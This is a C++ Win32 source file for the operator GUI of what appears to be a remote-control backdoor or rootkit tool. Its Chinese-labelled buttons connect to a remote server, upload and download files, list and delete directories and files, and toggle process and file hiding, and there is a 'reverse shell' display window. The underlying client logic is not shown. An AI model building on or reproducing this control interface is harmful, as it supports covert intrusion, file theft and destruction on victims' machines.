#include"GUI.h"
#include<Shlobj.h>
#include<string.h>



void GUI::Init(HWND hwnd){

	//初始化画面
	int button_x = BUTTON_X;
	int button_y = BUTTON_Y;

	//第一列
	hwndbutton[BUTTON_CLIENT_CONNECT] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_CLIENT_CONNECT],"连接服务器");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_FILE_UPLOAD] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_FILE_UPLOAD],"上传文件");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_FILE_DOWNLOAD] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,		
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_FILE_DOWNLOAD],"下载文件");

	hwndbutton[BUTTON_SHELL_WINDOW]=CreateWindow("EDIT",NULL,WS_CHILD|WS_BORDER|WS_VISIBLE|ES_LEFT|ES_MULTILINE|ES_READONLY,
		SHELL_X,SHELL_Y,SHELL_WIDTH,SHELL_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),NULL); 
	SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"反弹SHELL显示窗口");

	
	//第二列
	button_x += BUTTON_DISTANCE+BUTTON_WIDTH;
	button_y = BUTTON_Y;

	hwndbutton[BUTTON_PROCESS_HIDE] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_PROCESS_HIDE],"进程隐藏");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_FILE_HIDE] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"文件隐藏");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_INPUT]=CreateWindow("EDIT",NULL,WS_CHILD|WS_BORDER|WS_VISIBLE|ES_LEFT|ES_MULTILINE,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),NULL); 
	SetWindowText(hwndbutton[BUTTON_SHELL_INPUT],"C:\\HIDEME");


	//第三列
	button_x += BUTTON_DISTANCE+BUTTON_WIDTH;
	button_y = BUTTON_Y;

	hwndbutton[BUTTON_SHELL_LS] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_LS],"LS");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_MKDIR] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_MKDIR],"MKDIR");

	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_RMDIR] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_RMDIR],"RMDIR");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_RM] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_RM],"RM");

    MoveWindow(hwnd,SCREEN_X,SCREEN_Y,SCREEN_WIDTH,SCREEN_HEIGHT,TRUE);

}


void GUI::ScreenPaint(HWND hwnd){        //绘制桌面背景
	
	PAINTSTRUCT ps;
	HDC hdc= BeginPaint(hwnd, &ps);
	HDC hdcMem = CreateCompatibleDC(hdc);  
	const char* lpszName = "rc2.bmp";
	HBITMAP hBitmap = (HBITMAP)::LoadImage(
		NULL,
		lpszName,
		IMAGE_BITMAP,
		0,
		0,
		LR_LOADFROMFILE);
    BITMAP bm;
    SelectObject(hdcMem,hBitmap);
    GetObject(hBitmap, sizeof(bm), &bm);
    BitBlt(hdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
    DeleteDC(hdcMem);
    EndPaint(hwnd, &ps);

}


void GUI::CommandExecute(HWND hwnd,int dir){
	switch(dir)
	{
	case BUTTON_CLIENT_CONNECT:
		//判断服务器是否连接
		if(isconnected){
			//断开socket服务器
			if(mc->CloseSocket()){
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"SERVER HAS BEEN SHUT DOWN.");
				SetWindowText(hwndbutton[BUTTON_CLIENT_CONNECT],"连接服务器");
				isconnected = false;
			}
			else
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"SERVER SHUT DOWN FAIL.");
			SetWindowText(hwndbutton[BUTTON_CLIENT_CONNECT],"连接服务器");
			isconnected = false;
		}
		else{
			//初始化socket
			mc = new MLHT_CLIENT(SERVER_IP,SERVER_PORT);
			//连接socket服务端
			if(mc->ConnectServer())
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"CONNECT SERVER SUCCESSFUL.");
			else
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"CONNECT SERVER FAIL.");
			SetWindowText(hwndbutton[BUTTON_CLIENT_CONNECT],"断开服务器");
			isconnected =true;
		}
		break;
	case BUTTON_FILE_UPLOAD:
		{
			if(!isconnected)
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
			else{
				TCHAR str[MAX_PATH] = {0};

				TCHAR uploadFilename[MAX_PATH] = {0};									//将上传的文件
				TCHAR uploadFiledir[MAX_PATH];											//上传到服务器的文件路径
				GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],uploadFiledir,MAX_PATH);	//从输入框中获取上传到服务器的目标路径

				//初始化文件选择框
				OPENFILENAME ofn= {0};
				ofn.lStructSize = sizeof(ofn);
				ofn.hwndOwner = hwnd;
				//ofn.lpstrFilter = "Exe文件(*.exe)\0*.exe\0所有文件(*.*)\0*.*\0";//要选择的文件后缀
				ofn.lpstrFilter = 
					"所有文件(*.*)";				//要选择的文件后缀
				ofn.lpstrInitialDir = "c:\\users";	//默认的文件路径
				ofn.lpstrFile = uploadFilename;		//存放文件的缓冲区
				ofn.nMaxFile = sizeof(uploadFilename)/sizeof(*uploadFilename);
				ofn.nFilterIndex = 0;
				ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_EXPLORER ;//标志如果是多选要加上OFN_ALLOWMULTISELECT

				if(GetOpenFileName(&ofn)){
					wsprintf(uploadFiledir,"%s\\%s",uploadFiledir,GetFilename(uploadFilename));//拼接上传到服务器的文件路径
					int ret = mc->UpLoadFile(uploadFilename,uploadFiledir);
					if(ret == OP_SUCCESS)
						wsprintf(str,"已成功将本地文件:%s\r\n上传至服务端:%s",uploadFilename,uploadFiledir);
					else
						wsprintf(str,"上传失败: %d",ret);
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
				}
			}
		}
		break;
	case BUTTON_FILE_DOWNLOAD:
		{
			if(!isconnected)
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
			else{
				TCHAR str[MAX_PATH] = {0};
			
				TCHAR downloadFiledir[MAX_PATH] = {0};										//下载到本地的文件路径
				TCHAR downloadFilename[MAX_PATH];											//服务端文件名
				GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],downloadFilename,MAX_PATH);	//从输入框中获取服务端文件名

				BROWSEINFO bi;
				ZeroMemory(&bi,sizeof(BROWSEINFO)); 
				bi.hwndOwner = NULL; 
				bi.pszDisplayName = downloadFiledir; 
				bi.lpszTitle = "从下面选择将下载到文件的文件夹:"; 
				bi.ulFlags = BIF_RETURNFSANCESTORS;
				LPITEMIDLIST idl = SHBrowseForFolder(&bi);
				if (idl != NULL)
				{ 
					//选择将下载到文件的文件夹
					if(SHGetPathFromIDList(idl,downloadFiledir))
					{
						wsprintf(downloadFiledir,"%s\\%s",downloadFiledir,GetFilename(downloadFilename));//拼接下载到本地的文件路径
						int ret = mc->DownLoadFile(downloadFilename,downloadFiledir);
						if(ret == OP_SUCCESS)
							wsprintf(str,"将服务端文件：%s \r\n下载至本地：%s",downloadFilename,downloadFiledir);
						else
							wsprintf(str,"下载失败: %d",ret);
						SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
					}
				}
			}
		}
		break;
	case BUTTON_PROCESS_HIDE:
		if(!isconnected)
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
		else{
			if(processhide){
				if(mc->ShowProcess() == OP_SUCCESS){
					processhide = false;
					SetWindowText(hwndbutton[BUTTON_PROCESS_HIDE],"进程隐藏");
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"已发出进程显示指令");
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"指令发出失败");
			}
			else{
				if(mc->HideProcess() == OP_SUCCESS){
					processhide = true;
					SetWindowText(hwndbutton[BUTTON_PROCESS_HIDE],"进程显示");
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"已发出进程隐藏指令");
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"指令发出失败");
			}
		}
		break;
	case BUTTON_FILE_HIDE:
		if(!isconnected)
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
		else{
			if(filehide){
				if(mc->ShowFile() == OP_SUCCESS){
					filehide = false;
					SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"文件隐藏");
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"已发出文件显示指令");
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"指令发出失败");
			}
			else{
				if(mc->HideFile() == OP_SUCCESS){
					filehide = true;
					SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"文件显示");
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"已发出文件隐藏指令");
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"指令发出失败");
			}
		}
		break;
	case BUTTON_SHELL_INPUT:
		break;
	case BUTTON_SHELL_LS:
		{
			if(!isconnected)
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
			else{
				TCHAR str[MLHT_SLICE_FILE_LENGTH] = {0};

				TCHAR filedir[MAX_PATH];
				GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],filedir,MAX_PATH);	//获取LS目录

				if(mc->ShellLs(filedir) == OP_SUCCESS){
					wsprintf(str,"%s文件目录为：\r\n%s",filedir,mc->p_get->GetPacketContent());
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"列目录失败");
			}
		}
		break;
	case BUTTON_SHELL_MKDIR:
		{
			if(!isconnected)
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
			else{
				TCHAR str[MAX_PATH] = {0};

				TCHAR filedir[MAX_PATH];
				GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],filedir,MAX_PATH);	//获取MKDIR路径

				if(mc->ShellMkdir(filedir) == OP_SUCCESS){
					wsprintf(str,"已创建文件目录：\r\n%s",filedir);
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"创建文件目录失败");
			}
		}
		break;
	case BUTTON_SHELL_RMDIR:
		{
			if(!isconnected)
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
			else{
				TCHAR str[MAX_PATH] = {0};

				TCHAR filedir[MAX_PATH];
				GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],filedir,MAX_PATH);	//获取RMDIR路径

				if(mc->ShellRmdir(filedir) == OP_SUCCESS){
					wsprintf(str,"已删除文件目录：\r\n%s",filedir);
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"删除文件目录失败");
			}
		}
		break;
	case BUTTON_SHELL_RM:
		{
			if(!isconnected)
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
			else{
				TCHAR str[MAX_PATH] = {0};

				TCHAR filename[MAX_PATH];
				GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],filename,MAX_PATH); //获取RM路径

				if(mc->ShellRm(filename) == OP_SUCCESS){
					wsprintf(str,"已删除文件：\r\n%s",filename);
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"删除文件失败");
			}
		}
		break;
	default:
		break;
	}
}

char* GUI::GetFilename(char* FullPathName)	//获取全路径中的文件名
{
	char* pos = FullPathName+strlen(FullPathName);
	while(*pos != '\\'&& pos!=FullPathName)
		pos--;
	if(pos == FullPathName)
		return pos;
	else
		return pos+1;
}